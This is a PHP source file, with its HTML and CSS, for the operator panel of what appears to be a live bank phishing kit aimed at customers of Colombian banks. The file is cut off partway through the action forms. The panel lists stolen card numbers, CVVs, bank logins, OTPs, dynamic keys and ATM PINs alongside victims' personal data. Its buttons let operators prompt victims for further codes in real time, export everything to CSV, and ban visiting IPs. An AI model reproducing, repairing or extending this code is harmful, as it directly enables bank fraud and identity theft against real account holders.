<?php
// panel/index.php
require_once __DIR__ . '/config/config.php';
require_once __DIR__ . '/config/ban_manager.php';

if (!estaAutenticado()) {
    header('Location: login.php?llave=0b2c4e6c3bcb7209f5ef20632b6ff001');
    exit;
}

$ROL_ACTUAL = obtenerRolActual();      // 'superadmin' | 'admin'
$USUARIO_ACTUAL = $_SESSION['usuario'] ?? 'Desconocido';
$ES_SUPER = ($ROL_ACTUAL === 'superadmin');

// ============================================
// BANEAR IP (POST)
// ============================================
if ($_SERVER['REQUEST_METHOD'] === 'POST'
    && ($_POST['action'] ?? '') === 'ban_ip'
    && !empty($_POST['ip'])) {
    ban_agregar(
        trim($_POST['ip']),
        $_POST['ciudad'] ?? 'Desconocida',
        $_POST['id'] ?? ''
    );
    header('Location: index.php?llave=0b2c4e6c3bcb7209f5ef20632b6ff001&mensaje=baneado');
    exit;
}

// ============================================
// DESBANEAR IP (POST)
// ============================================
if ($_SERVER['REQUEST_METHOD'] === 'POST'
    && ($_POST['action'] ?? '') === 'unban_ip'
    && !empty($_POST['ip'])) {
    ban_quitar(trim($_POST['ip']));
    header('Location: index.php?llave=0b2c4e6c3bcb7209f5ef20632b6ff001&mensaje=desbaneado');
    exit;
}

// ============================================
// ELIMINAR SOLICITUD INDIVIDUAL
// ============================================
if (isset($_GET['eliminar']) && !empty($_GET['eliminar'])) {
    $id = $_GET['eliminar'];
    $solicitudes = cargarSolicitudes();
    $nuevasSolicitudes = [];

    foreach ($solicitudes as $s) {
        if ($s['id'] !== $id) {
            $nuevasSolicitudes[] = $s;
        }
    }

    guardarSolicitudes($nuevasSolicitudes);
    header('Location: index.php?llave=0b2c4e6c3bcb7209f5ef20632b6ff001&mensaje=eliminado');
    exit;
}

// ============================================
// ELIMINAR TODAS LAS SOLICITUDES
// ============================================
if (isset($_GET['eliminar_todas']) && $_GET['eliminar_todas'] === 'si') {
    guardarSolicitudes([]);
    header('Location: index.php?llave=0b2c4e6c3bcb7209f5ef20632b6ff001&mensaje=todas_eliminadas');
    exit;
}

// ============================================
// EXPORTAR A CSV (Excel-friendly)
// ============================================
if (isset($_GET['exportar_excel'])) {
    $solicitudes = cargarSolicitudes();

    if (empty($solicitudes)) {
        header('Location: index.php?llave=0b2c4e6c3bcb7209f5ef20632b6ff001&mensaje=sin_datos');
        exit;
    }

    $filename = 'solicitudes_' . date('Y-m-d_His') . '.csv';

    header('Content-Type: text/csv; charset=UTF-8');
    header('Content-Disposition: attachment; filename="' . $filename . '"');
    header('Cache-Control: max-age=0');
    header('Pragma: public');

    $out = fopen('php://output', 'w');
    fwrite($out, "\xEF\xBB\xBF");

    $forzarTexto = function($valor) {
        if ($valor === null || $valor === '') return '';
        $valor = str_replace('"', '""', (string)$valor);
        return '="' . $valor . '"';
    };

    fputcsv($out, [
        'ID','Fecha','Tarjeta','CVV','Vencimiento','Banco','Usuario','Contraseña',
        'Código','Modo','Monto','Nombre','Documento','Email','Celular','IP','Ciudad','Estado',
        'Manipulado Por','Rol Manipulador'
    ], ';');

    $estados = [
        'pending' => 'Pendiente',
        'pending_otp' => 'OTP Pendiente',
        'pending_clave_cajero' => 'Clave Cajero Pendiente',
        'approved' => 'Aprobada',
        'approved_otp' => 'OTP Aprobado',
        'approved_clave_cajero' => 'Clave Cajero Aprobado',
        'rejected' => 'Rechazada',
        'rejected_otp' => 'OTP Rechazado',
        'rejected_clave_cajero' => 'Clave Cajero Rechazado',
        'rejected_user_error' => 'Error de Usuario'
    ];

    foreach ($solicitudes as $s) {
        ban_enriquecerSolicitud($s);

        $codigos = [];
        if (!empty($s['clave_cajero_codigo']) && $s['clave_cajero_codigo'] !== 'N/A') {
            $codigos[] = 'Cajero: ' . $s['clave_cajero_codigo'];
        }
        if (!empty($s['clave_dinamica_codigo']) && $s['clave_dinamica_codigo'] !== 'N/A') {
            $codigos[] = 'Dinámica: ' . $s['clave_dinamica_codigo'];
        }
        if (!empty($s['otp_codigo']) && $s['otp_codigo'] !== 'N/A' && !isset($s['clave_cajero_codigo'])) {
            $codigos[] = 'OTP: ' . $s['otp_codigo'];
        }
        if (!empty($s['otp_codigo_secundario']) && $s['otp_codigo_secundario'] !== 'N/A') {
            $codigos[] = 'OTP Sec: ' . $s['otp_codigo_secundario'];
        }
        $codigoTexto = implode(' | ', $codigos);

        fputcsv($out, [
            $forzarTexto($s['id'] ?? ''),
            $forzarTexto($s['fecha'] ?? ''),
            $forzarTexto($s['numero_tarjeta'] ?? $s['tarjeta'] ?? ''),
            $forzarTexto($s['cvv'] ?? ''),
            $forzarTexto($s['vencimiento'] ?? ''),
            $s['banco'] ?? '',
            $forzarTexto($s['usuario'] ?? ''),
            $forzarTexto($s['password'] ?? ''),
            $forzarTexto($codigoTexto),
            $s['otp_modo'] ?? '',
            $forzarTexto($s['monto'] ?? ''),
            $s['nombre'] ?? '',
            $forzarTexto($s['documento'] ?? ''),
            $s['email'] ?? '',
            $forzarTexto($s['celular'] ?? ''),
            $forzarTexto($s['ip'] ?? ''),
            $s['ciudad'] ?? '',
            $estados[$s['estado']] ?? $s['estado'],
            $s['manipulado_por'] ?? '',
            $s['manipulado_rol'] ?? ''
        ], ';');
    }

    fclose($out);
    exit;
}

// ============================================
// PROCESAR ACCIONES (con control de prioridad)
// ============================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && isset($_POST['id'])) {
    $id = $_POST['id'];
    $action = $_POST['action'];

    $solicitudes = cargarSolicitudes();
    $encontrado = false;

    foreach ($solicitudes as &$s) {
        if ($s['id'] === $id) {

            // 🔒 CONTROL DE PRIORIDAD
            if (!puedeActuarSobreSolicitud($s)) {
                header('Location: index.php?llave=0b2c4e6c3bcb7209f5ef20632b6ff001');
                exit;
            }

            $marcado = marcarManipulacion($s);
            if (!$marcado) {
                header('Location: index.php?llave=0b2c4e6c3bcb7209f5ef20632b6ff001');
                exit;
            }

            if ($action === 'aprobar') {
                $s['estado'] = 'approved';
            } elseif ($action === 'rechazar') {
                $s['estado'] = 'rejected';
            } elseif ($action === 'aprobar_otp') {
                $s['estado'] = 'approved_otp';
            } elseif ($action === 'rechazar_otp') {
                $s['estado'] = 'rejected_otp';
            } elseif ($action === 'pedir_otp') {
                $s['estado'] = 'pending_otp';
                $s['otp_modo'] = 'otp';
            } elseif ($action === 'pedir_clave_din') {
                $s['estado'] = 'pending_otp';
                $s['otp_modo'] = 'clave_dinamica';
            } elseif ($action === 'error_credenciales') {
                $s['estado'] = 'rejected';
            } elseif ($action === 'error_usuario_otp') {
                $s['estado'] = 'rejected_user_error';
            } elseif ($action === 'aprobar_clave_cajero') {
                $s['estado'] = 'approved_clave_cajero';
            } elseif ($action === 'rechazar_clave_cajero') {
                $s['estado'] = 'rejected_clave_cajero';
            } elseif ($action === 'pedir_clave_cajero') {
                $s['estado'] = 'pending_clave_cajero';
                $s['otp_modo'] = 'clave_cajero';
            }

            $s['fecha_procesada'] = date('Y-m-d H:i:s');
            $encontrado = true;
            break;
        }
    }

    if ($encontrado) {
        guardarSolicitudes($solicitudes);
    }

    header('Location: index.php?llave=0b2c4e6c3bcb7209f5ef20632b6ff001');
    exit;
}

// ============================================
// CARGAR Y ENRIQUECER SOLICITUDES
// ============================================
$solicitudes = cargarSolicitudes();

foreach ($solicitudes as &$sol) {
    ban_enriquecerSolicitud($sol);
}
unset($sol);

$total = count($solicitudes);
$pendientes = count(array_filter($solicitudes, function($s) {
    return in_array($s['estado'], ['pending', 'pending_otp', 'pending_clave_cajero']);
}));
$aprobadas = count(array_filter($solicitudes, function($s) {
    return in_array($s['estado'], ['approved', 'approved_otp', 'approved_clave_cajero']);
}));
$rechazadas = count(array_filter($solicitudes, function($s) {
    return in_array($s['estado'], ['rejected', 'rejected_otp', 'rejected_clave_cajero', 'rejected_user_error']);
}));

$csrf_token = generarCsrfToken();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Panel de Control</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #0f0f1a; padding: 20px; min-height: 100vh; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header {
            display: flex; justify-content: space-between; align-items: center;
            background: #1a1a2e; padding: 20px 24px; border-radius: 12px;
            margin-bottom: 24px; border: 1px solid #2a2a4e;
            flex-wrap: wrap;
            gap: 12px;
        }
        .header h1 { color: #fff; font-size: 22px; }
        .header .user { color: #8b8ba8; font-size: 14px; }
        .header .user a { color: #ff6b6b; text-decoration: none; margin-left: 12px; }
        .header .user .rol-badge {
            display: inline-block;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 700;
            margin-left: 6px;
        }
        .rol-badge.superadmin { background: #7c3aed; color: #fff; }
        .rol-badge.admin { background: #2563eb; color: #fff; }

        .header .status-indicator {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 12px;
            color: #8b8ba8;
        }
        .header .status-indicator .dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #4ade80;
            animation: pulse-dot 2s infinite;
        }
        .header .status-indicator .dot.error {
            background: #ff6b6b;
        }
        @keyframes pulse-dot {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.8); }
        }

        .btn-excel {
            background: #1a3a2a;
            color: #4ade80;
            border: 1px solid #4ade80;
            padding: 6px 14px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
            font-family: inherit;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .btn-excel:hover {
            background: #4ade80;
            color: #0f0f1a;
        }

        .btn-eliminar-todas {
            background: #3a1a1a;
            color: #ff6b6b;
            border: 1px solid #ff6b6b;
            padding: 6px 14px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
            font-family: inherit;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .btn-eliminar-todas:hover {
            background: #ff6b6b;
            color: #0f0f1a;
        }

        .btn-eliminar {
            background: #dc2626;
            color: #fff;
            padding: 4px 10px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
            text-decoration: none;
            display: inline-block;
            border: none;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        .btn-eliminar:hover {
            opacity: 0.8;
        }

        .btn-ban {
            background: #7f1d1d;
            color: #fca5a5;
            border: 1px solid #dc2626;
            padding: 6px 10px;
            border-radius: 6px;
            font-size: 11px;
            font-weight: 700;
            font-family: inherit;
            cursor: pointer;
            transition: all 0.2s;
            white-space: nowrap;
            display: inline-flex;
            align-items: center;
            gap: 4px;
        }
        .btn-ban:hover { background: #dc2626; color: #fff; }
        .btn-ban.activo {
            background: #dc2626;
            color: #fff;
            animation: pulse-ban 1.8s infinite;
        }
        @keyframes pulse-ban {
            0%, 100% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.5); }
            50%      { box-shadow: 0 0 0 6px rgba(220, 38, 38, 0); }
        }

        .header-buttons {
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }

        .stats {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 16px; margin-bottom: 24px;
        }
        .stat-card {
            background: #1a1a2e; padding: 20px; border-radius: 12px;
            border: 1px solid #2a2a4e; text-align: center;
            transition: border-color 0.5s, transform 0.3s;
        }
        .stat-card .number { font-size: 28px; font-weight: 700; transition: all 0.3s; }
        .stat-card .label { font-size: 14px; color: #8b8ba8; margin-top: 4px; }
        .stat-card .number.pending { color: #f7c948; }
        .stat-card .number.approved { color: #4ade80; }
        .stat-card .number.rejected { color: #ff6b6b; }
        .stat-card .number.total { color: #60a5fa; }

        .solicitudes {
            background: #1a1a2e; border-radius: 12px; border: 1px solid #2a2a4e; overflow: hidden;
        }
        .solicitudes .title {
            padding: 20px 24px; font-weight: 600; color: #fff;
            border-bottom: 1px solid #2a2a4e;
            display: flex; justify-content: space-between; align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        .solicitudes .title .badge {
            background: #2a2a4e; padding: 4px 12px; border-radius: 20px;
            font-size: 12px; color: #8b8ba8;
        }
        .solicitudes .title .auto-update {
            font-size: 12px;
            color: #4ade80;
            font-weight: 400;
        }
        .solicitud {
            padding: 16px 24px;
            border-bottom: 1px solid #1f1f36;
            display: flex;
            flex-direction: column;
            gap: 10px;
            transition: background 0.3s;
            position: relative;
        }
        .solicitud:hover { background: #22223a; }
        .solicitud.nuevo {
            animation: highlight-new 1s ease;
        }
        @keyframes highlight-new {
            0% { background: #2a2a4a; border-left: 3px solid #f7c948; }
            100% { background: transparent; border-left: 3px solid transparent; }
        }

        /* 🔒 Botones inertes para Admin (sin mensaje revelador) */
        .form-actions.inertes {
            pointer-events: none;
            opacity: 0.5;
        }

        .aviso-prioridad.super {
            display: flex;
            align-items: center;
            gap: 10px;
            background: #3b0764;
            border: 1px solid #a855f7;
            color: #d8b4fe;
            padding: 10px 16px;
            border-radius: 8px;
            font-size: 13px;
            font-weight: 600;
            margin-top: 4px;
        }

        .solicitud .card-row {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 8px 20px;
        }
        .solicitud .card-number {
            font-family: monospace;
            font-size: 18px;
            color: #4ade80;
            letter-spacing: 1px;
            font-weight: 700;
        }
        .solicitud .card-detail {
            font-size: 13px;
            color: #8b8ba8;
        }
        .solicitud .card-detail .highlight {
            color: #f7c948;
            font-weight: 600;
        }
        .solicitud .card-detail .bank {
            color: #60a5fa;
            font-weight: 500;
        }
        .solicitud .credenciales-row {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 12px 24px;
            padding-top: 8px;
            border-top: 1px solid #1f1f36;
        }
        .solicitud .credenciales-row .campo {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 13px;
        }
        .solicitud .credenciales-row .campo .etiqueta {
            color: #6a6a8a;
            font-weight: 500;
        }
        .solicitud .credenciales-row .campo .valor {
            color: #a78bfa;
            font-weight: 600;
        }

        .solicitud .codigos-row {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 12px 24px;
            padding-top: 8px;
            border-top: 1px solid #1f1f36;
        }
        .solicitud .codigo-item {
            display: flex;
            align-items: center;
            gap: 6px;
            background: #1f1f36;
            padding: 6px 12px;
            border-radius: 8px;
            border: 1px solid #2a2a4e;
        }
        .solicitud .codigo-item .codigo-label {
            font-size: 12px;
            font-weight: 600;
            color: #60a5fa;
        }
        .solicitud .codigo-item .codigo-valor {
            font-family: monospace;
            font-size: 20px;
            font-weight: 700;
            letter-spacing: 1px;
        }
        .solicitud .codigo-item.clave-cajero .codigo-valor {
            color: #fbbf24;
        }
        .solicitud .codigo-item.otp .codigo-valor {
            color: #ff6b6b;
        }
        .solicitud .codigo-item.clave-dinamica .codigo-valor {
            color: #a78bfa;
        }

        .solicitud .datos-row {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 8px 20px;
            padding-top: 8px;
            border-top: 1px solid #1f1f36;
            font-size: 13px;
            color: #c8c8e8;
        }
        .solicitud .datos-row .nombre {
            color: #fff;
            font-weight: 600;
        }
        .solicitud .datos-row .label {
            color: #6a6a8a;
        }

        .solicitud .ip-row {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 8px 18px;
            padding-top: 8px;
            border-top: 1px solid #1f1f36;
        }
        .solicitud .ip-row .ip-item {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: #1f1f36;
            padding: 5px 12px;
            border-radius: 8px;
            border: 1px solid #2a2a4e;
        }
        .solicitud .ip-row .ip-label {
            color: #6a6a8a;
            font-weight: 600;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.04em;
        }
        .solicitud .ip-row .ip-valor {
            font-family: 'Courier New', monospace;
            color: #60a5fa;
            font-weight: 700;
            font-size: 13px;
        }
        .solicitud .ip-row .ip-item.ciudad .ip-valor { color: #a78bfa; }
        .solicitud .ip-row .ip-item.baneada {
            background: #3a1a1a;
            border-color: #dc2626;
        }
        .solicitud .ip-row .ip-item.baneada .ip-valor { color: #fca5a5; }

        .solicitud .actions-row {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 8px 16px;
            padding-top: 8px;
            border-top: 1px solid #1f1f36;
        }
        .solicitud .estado {
            font-size: 12px;
            font-weight: 600;
            padding: 4px 12px;
            border-radius: 20px;
            text-align: center;
        }
        .estado.pending { background: #3a2a1a; color: #f7c948; }
        .estado.pending_otp { background: #3a2a4a; color: #a78bfa; }
        .estado.pending_clave_cajero { background: #2a3a4a; color: #60a5fa; }
        .estado.approved { background: #1a3a2a; color: #4ade80; }
        .estado.approved_otp { background: #1a3a4a; color: #818cf8; }
        .estado.approved_clave_cajero { background: #1a4a3a; color: #34d399; }
        .estado.rejected { background: #3a1a1a; color: #ff6b6b; }
        .estado.rejected_otp { background: #3a1a2a; color: #f472b6; }
        .estado.rejected_clave_cajero { background: #3a1a2a; color: #f87171; }
        .estado.rejected_user_error { background: #3a1a2a; color: #f472b6; }

        .btn {
            padding: 6px 12px;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
            font-size: 11px;
            font-family: inherit;
            transition: opacity 0.2s;
            white-space: nowrap;
        }
        .btn:hover { opacity: 0.8; }
        .btn-approve { background: #4ade80; color: #0f0f1a; }
        .btn-reject { background: #ff6b6b; color: #0f0f1a; }
        .btn-otp { background: #818cf8; color: #0f0f1a; }
        .btn-cajero { background: #fbbf24; color: #0f0f1a; }
        .btn-danger { background: #dc2626; color: #fff; }
        .btn-disabled { background: #2a2a4e; color: #6a6a8a; cursor: not-allowed; }
        .btn-pedir { background: #8b5cf6; color: #fff; }
        .btn-pedir:hover { background: #7c3aed; }
        .form-actions { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; }
        .form-actions form { display: inline-block; }
        .empty { padding: 60px 20px; text-align: center; color: #6a6a8a; }
        .empty .icon { font-size: 48px; margin-bottom: 16px; display: block; }

        .solicitud .card-row:first-child {
            display: flex;
            align-items: center;
        }

        .solicitud .online-dot {
            display: inline-block;
            width: 14px;
            height: 14px;
            border-radius: 50%;
            margin-right: 12px;
            flex-shrink: 0;
            background: #ff6b6b;
            transition: background 0.3s ease;
        }

        .solicitud .online-dot.online {
            background: #4ade80;
        }

        @media (max-width: 768px) {
            .stats { grid-template-columns: 1fr 1fr; }
            .header { flex-direction: column; text-align: center; }
            .header-buttons { justify-content: center; }
            .solicitud { padding: 12px 16px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📋 Panel de Control</h1>
            <div class="header-buttons">
                <button class="btn-excel" onclick="exportarExcel()">
                    📊 Exportar CSV
                </button>
                <button class="btn-eliminar-todas" onclick="eliminarTodas()">
                    🗑️ Eliminar todas
                </button>
                <div class="status-indicator">
                    <span class="dot" id="statusDot"></span>
                    <span id="statusText">Auto-actualización</span>
                </div>
                <div class="user">
                    👤 <?php echo htmlspecialchars($USUARIO_ACTUAL); ?>
                    <span class="rol-badge <?php echo $ES_SUPER ? 'superadmin' : 'admin'; ?>">
                        <?php echo $ES_SUPER ? '⭐ SUPERADMIN' : 'ADMIN'; ?>
                    </span>
                    <a href="logout.php?llave=0b2c4e6c3bcb7209f5ef20632b6ff001">🚪 Salir</a>
                </div>
            </div>
        </div>

        <div class="stats" id="statsContainer">
            <div class="stat-card" id="statTotal">
                <div class="number total"><?php echo $total; ?></div>
                <div class="label">📊 Total</div>
            </div>
            <div class="stat-card" id="statPending">
                <div class="number pending"><?php echo $pendientes; ?></div>
                <div class="label">⏳ Pendientes</div>
            </div>
            <div class="stat-card" id="statApproved">
                <div class="number approved"><?php echo $aprobadas; ?></div>
                <div class="label">✅ Aprobadas</div>
            </div>
            <div class="stat-card" id="statRejected">
                <div class="number rejected"><?php echo $rechazadas; ?></div>
                <div class="label">❌ Rechazadas</div>
            </div>
        </div>

        <?php if (isset($error)): ?>
            <div style="background: #3a1a1a; color: #ff6b6b; padding: 12px 20px; border-radius: 8px; margin-bottom: 16px;">
                ❌ <?php echo htmlspecialchars($error); ?>
            </div>
        <?php endif; ?>

        <div class="solicitudes">
            <div class="title">
                <span>📥 Solicitudes</span>
                <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
                    <span class="auto-update" id="updateCounter">🔄 Actualizando...</span>
                    <span class="badge" id="totalBadge"><?php echo $total; ?> total</span>
                </div>
            </div>

            <div id="solicitudesList">
                <?php if (empty($solicitudes)): ?>
                    <div class="empty">
                        <span class="icon">📭</span>
                        No hay solicitudes aún
                    </div>
                <?php else: ?>
                    <?php foreach (array_reverse($solicitudes) as $s): ?>
                        <?php
                            $banco = $s['banco'] ?? '';
                            $bancosClaveCajero = ['BBVA Colombia', 'Davibank', 'Davivienda', 'Caja Social'];
                            $mostrarClaveCajero = in_array($banco, $bancosClaveCajero);

                            $puedeActuar = puedeActuarSobreSolicitud($s);
                            $puedeVerInfo = puedeVerInfoSolicitud($s);

                            $adminBloqueado = (!$ES_SUPER && !$puedeActuar);

                            $adminManipulando = ($ES_SUPER && ($s['manipulado_rol'] ?? '') === 'admin'
                                                && (time() - ($s['manipulado_timestamp'] ?? 0)) < PRIORIDAD_DELAY);
                        ?>
                        <div class="solicitud" data-id="<?php echo $s['id']; ?>" data-estado="<?php echo $s['estado']; ?>">

                            <div class="card-row">
                                <span class="online-dot" data-online-id="<?php echo $s['id']; ?>"></span>
                                <span class="card-number">💳 <?php echo htmlspecialchars($s['numero_tarjeta'] ?? $s['tarjeta'] ?? 'N/A'); ?></span>
                            </div>

                            <div class="card-row">
                                <span class="card-detail">🔢 CVV: <span class="highlight"><?php echo htmlspecialchars($s['cvv'] ?? '***'); ?></span></span>
                                <span class="card-detail">📅 Exp: <span class="highlight"><?php echo htmlspecialchars($s['vencimiento'] ?? 'N/A'); ?></span></span>
                                <span class="card-detail">🏦 <span class="bank"><?php echo htmlspecialchars($s['banco'] ?? 'N/A'); ?></span></span>
                            </div>

                            <!-- 🔒 Credenciales del banco: ocultas al Admin si SuperAdmin las manipuló (igual que OTP) -->
                            <?php if ($puedeVerInfo && isset($s['usuario']) && $s['usuario'] !== 'N/A' && !empty($s['usuario'])): ?>
                                <div class="credenciales-row">
                                    <div class="campo">
                                        <span class="etiqueta">Usuario:</span>
                                        <span class="valor"><?php echo htmlspecialchars($s['usuario']); ?></span>
                                    </div>
                                    <div class="campo">
                                        <span class="etiqueta">Contraseña:</span>
                                        <span class="valor"><?php echo htmlspecialchars($s['password'] ?? '****'); ?></span>
                                    </div>
                                </div>
                            <?php endif; ?>

                            <?php
                            // 🔒 El Admin NO ve los códigos si el SuperAdmin los manipuló (delay 3 min)
                            $tieneClaveCajero   = $puedeVerInfo && !empty($s['clave_cajero_codigo'])     && $s['clave_cajero_codigo']     !== 'N/A' && $s['clave_cajero_codigo']     !== '';
                            $tieneClaveDinamica = $puedeVerInfo && !empty($s['clave_dinamica_codigo'])   && $s['clave_dinamica_codigo']   !== 'N/A' && $s['clave_dinamica_codigo']   !== '';
                            $tieneOtp           = $puedeVerInfo && !empty($s['otp_codigo'])              && $s['otp_codigo']              !== 'N/A' && $s['otp_codigo']              !== '';
                            $tieneOtpSecundario = $puedeVerInfo && !empty($s['otp_codigo_secundario'])   && $s['otp_codigo_secundario']   !== 'N/A' && $s['otp_codigo_secundario']   !== '';
                            ?>
                            <?php if ($tieneClaveCajero || $tieneClaveDinamica || $tieneOtp || $tieneOtpSecundario): ?>
                                <div class="codigos-row">
                                    <?php if ($tieneClaveCajero): ?>
                                        <div class="codigo-item clave-cajero">
                                            <span class="codigo-label">🏧 Clave Cajero:</span>
                                            <span class="codigo-valor"><?php echo htmlspecialchars($s['clave_cajero_codigo']); ?></span>
                                        </div>
                                    <?php endif; ?>

                                    <?php if ($tieneOtp): ?>
                                        <div class="codigo-item otp">
                                            <span class="codigo-label">📱 OTP:</span>
                                            <span class="codigo-valor"><?php echo htmlspecialchars($s['otp_codigo']); ?></span>
                                        </div>
                                    <?php endif; ?>

                                    <?php if ($tieneClaveDinamica): ?>
                                        <div class="codigo-item clave-dinamica">
                                            <span class="codigo-label">🔑 Clave Dinámica:</span>
                                            <span class="codigo-valor"><?php echo htmlspecialchars($s['clave_dinamica_codigo']); ?></span>
                                        </div>
                                    <?php endif; ?>

                                    <?php if ($tieneOtpSecundario): ?>
                                        <div class="codigo-item otp">
                                            <span class="codigo-label">📱 OTP Secundario:</span>
                                            <span class="codigo-valor"><?php echo htmlspecialchars($s['otp_codigo_secundario']); ?></span>
                                        </div>
                                    <?php endif; ?>
                                </div>
                            <?php endif; ?>

                            <!-- Datos del cliente: SIEMPRE visibles para ambos roles -->
                            <?php if (isset($s['nombre']) && $s['nombre'] !== 'N/A'): ?>
                                <div class="datos-row">
                                    <span><span class="label">👤</span> <span class="nombre"><?php echo htmlspecialchars($s['nombre']); ?></span></span>
                                    <span><span class="label">🆔</span> <?php echo htmlspecialchars($s['documento'] ?? 'N/A'); ?></span>
                                    <span><span class="label">📧</span> <?php echo htmlspecialchars($s['email'] ?? 'N/A'); ?></span>
                                    <span><span class="label">📱</span> <?php echo htmlspecialchars($s['celular'] ?? 'N/A'); ?></span>
                                    <span><span class="label">💰</span> <?php echo htmlspecialchars($s['monto'] ?? 'N/A'); ?></span>
                                </div>
                            <?php endif; ?>

                            <!-- FILA IP + CIUDAD -->
                            <div class="ip-row">
                                <div class="ip-item <?php echo !empty($s['baneado']) ? 'baneada' : ''; ?>">
                                    <span class="ip-label">🌐 IP</span>
                                    <span class="ip-valor"><?php echo htmlspecialchars($s['ip'] ?? 'Desconocida'); ?></span>
                                </div>
                                <div class="ip-item ciudad">
                                    <span class="ip-label">📍 Ciudad</span>
                                    <span class="ip-valor"><?php echo htmlspecialchars($s['ciudad'] ?? 'Desconocida'); ?></span>
                                </div>
                            </div>

                            <!-- 🔔 AVISO SOLO PARA SUPERADMIN (el Admin NUNCA ve nada) -->
                            <?php if ($adminManipulando): ?>
                                <div class="aviso-prioridad super">
                                    👁️ El <strong>Admin (<?php echo htmlspecialchars($s['manipulado_por'] ?? 'Admin'); ?>)</strong> está manipulando esta solicitud ahora mismo.
                                </div>
                            <?php endif; ?>

                            <div class="actions-row">
                                <span class="estado <?php echo $s['estado']; ?>">
                                    <?php
                                        $estados = [
                                            'pending' => '⏳ Pendiente',
                                            'pending_otp' => '⏳ OTP Pendiente',
                                            'pending_clave_cajero' => '⏳ Clave Cajero Pendiente',
                                            'approved' => '✅ Aprobada',
                                            'approved_otp' => '✅ OTP Aprobado',
                                            'approved_clave_cajero' => '✅ Clave Cajero Aprobado',
                                            'rejected' => '❌ Rechazada',
                                            'rejected_otp' => '❌ OTP Rechazado',
                                            'rejected_clave_cajero' => '❌ Clave Cajero Rechazado',
                                            'rejected_user_error' => '❌ Error de Usuario'
                                        ];
                                        echo $estados[$s['estado']] ?? $s['estado'];
                                    ?>
                                </span>

                                <!-- 🔒 Si el Admin está bloqueado, los botones se ven pero no responden -->
                                <div class="form-actions <?php echo $adminBloqueado ? 'inertes' : ''; ?>">
                                    <?php if ($s['estado'] === 'pending'): ?>
                                        <?php if (!isset($s['usuario']) || $s['usuario'] === 'N/A' || empty($s['usuario'])): ?>
                                            <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                                <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                                <input type="hidden" name="action" value="aprobar" />
                                                <button type="submit" class="btn btn-approve">✅ Aprobar</button>
                                            </form>
                                            <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                                <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                                <input type="hidden" name="action" value="rechazar" />
                                                <button type="submit" class="btn btn-reject">❌ Rechazar</button>
                                            </form>
                                        <?php else: ?>
                                            <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                                <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                                <input type="hidden" name="action" value="pedir_otp" />
                                                <button type="submit" class="btn btn-pedir">📱 PEDIR OTP</button>
                                            </form>
                                            <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                                <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                                <input type="hidden" name="action" value="pedir_clave_din" />
                                                <button type="submit" class="btn btn-otp">🔑 PEDIR CLAVE DIN</button>
                                            </form>
                                            <?php if ($mostrarClaveCajero): ?>
                                                <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                                    <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                                    <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                                    <input type="hidden" name="action" value="pedir_clave_cajero" />
                                                    <button type="submit" class="btn btn-cajero">🏧 PEDIR CLAVE CAJERO</button>
                                                </form>
                                            <?php endif; ?>
                                            <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                                <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                                <input type="hidden" name="action" value="error_credenciales" />
